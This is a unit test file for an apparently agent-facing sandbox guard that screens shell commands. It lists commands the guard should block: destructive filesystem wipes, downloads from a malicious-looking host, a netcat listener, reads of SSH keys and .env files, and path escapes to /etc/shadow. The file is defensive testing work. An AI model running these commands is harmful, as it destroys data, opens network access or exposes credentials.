"""Unit tests for the pre-run security guard."""

from reprobox.constants import (
    ORIGIN_AGENT,
    ORIGIN_PIPELINE,
    TEST_FILE_PATH,
)
from reprobox.sandbox.guard import Guard


def test_guard_allows_safe_commands():
    safe_commands = [
        "ls -la",
        "cat /workspace/case/setup.py",
        "head -n 20 /workspace/case/README.md",
        "tail -n 10 /workspace/case/setup.cfg",
        "grep -rn 'def ' /workspace/case/src",
        "find /workspace/case -name '*.py'",
        "sed -n '1,10p' /workspace/case/setup.py",
        "sort /workspace/case/requirements.txt",
        "uniq /workspace/case/data.txt",
        "diff -u /workspace/case/a.py /workspace/case/b.py",
        "pwd",
        "echo 'testing'",
        "python3 -m pytest /workspace/case/tests",
    ]
    for cmd in safe_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert (
            decision.allowed
        ), f"Expected allow for '{cmd}', got {decision.rule_id}: {decision.reason}"


def test_guard_blocks_destructive_fs():
    bad_commands = [
        "rm -rf /",
        "rm -rf /workspace/case/..",
        "rm -f /home/user/*",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        "chmod -R 777 /",
    ]
    for cmd in bad_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == "destructive_fs"


def test_guard_blocks_network_egress():
    egress_commands = [
        "curl https://example.com",
        "wget http://malicious.invalid/script.sh",
        "nc -lvp 4444",
        "ssh user@remote",
        "scp file user@host:/tmp",
    ]
    for cmd in egress_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == "network_egress"


def test_guard_blocks_package_install():
    install_commands = [
        "pip install requests",
        "pip3 install pytest",
        "apt-get install -y vim",
        "npm install express",
        "git clone https://github.com/test/repo",
    ]
    for cmd in install_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == "package_install"


def test_guard_blocks_secret_and_env_reads():
    secret_commands = [
        "cat /workspace/case/.env",
        "cat ~/.ssh/id_rsa",
        "printenv",
        "export",
        "cat /proc/1/environ",
    ]
    for cmd in secret_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == "secret_access"


def test_guard_blocks_metacharacters():
    meta_commands = [
        ("echo 1; echo 2", "metachar_semicolon"),
        ("echo 1 && echo 2", "metachar_ampersand"),
        ("echo `whoami`", "metachar_backtick"),
        ("echo $SECRET_KEY", "metachar_dollar"),
        ("echo 1 > /tmp/out", "metachar_redirect"),
    ]
    for cmd, expected_rule in meta_commands:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == expected_rule


def test_guard_blocks_path_escape():
    escapes = [
        "cat /etc/passwd",
        "ls /root",
        "cat /workspace/case/../../etc/shadow",
        "python3 -m pytest /etc",
    ]
    for cmd in escapes:
        decision = Guard.evaluate(cmd, origin=ORIGIN_AGENT)
        assert not decision.allowed, f"Expected block for '{cmd}'"
        assert decision.rule_id == "path_escape"


def test_guard_test_file_write_policy():
    # Valid write
    valid_dec = Guard.evaluate_test_file_write(TEST_FILE_PATH, "def test_issue(): assert False\n")
    assert valid_dec.allowed

    # Wrong path
    wrong_path_dec = Guard.evaluate_test_file_write("/workspace/case/setup.py", "x = 1")
    assert not wrong_path_dec.allowed
    assert wrong_path_dec.rule_id == "invalid_test_path"

    # Too large
    huge_content = "a" * 8001
    large_dec = Guard.evaluate_test_file_write(TEST_FILE_PATH, huge_content)
    assert not large_dec.allowed
    assert large_dec.rule_id == "test_file_too_large"

    # Null byte
    null_dec = Guard.evaluate_test_file_write(TEST_FILE_PATH, "def test():\x00 pass")
    assert not null_dec.allowed
    assert null_dec.rule_id == "test_file_null_byte"


def test_pipeline_origin_allowlist():
    assert Guard.evaluate("python3 --version", origin=ORIGIN_PIPELINE).allowed
    assert Guard.evaluate("python3 -m pytest /workspace/case", origin=ORIGIN_PIPELINE).allowed
    assert Guard.evaluate("uname -a", origin=ORIGIN_PIPELINE).allowed
    assert not Guard.evaluate("rm -rf /", origin=ORIGIN_PIPELINE).allowed
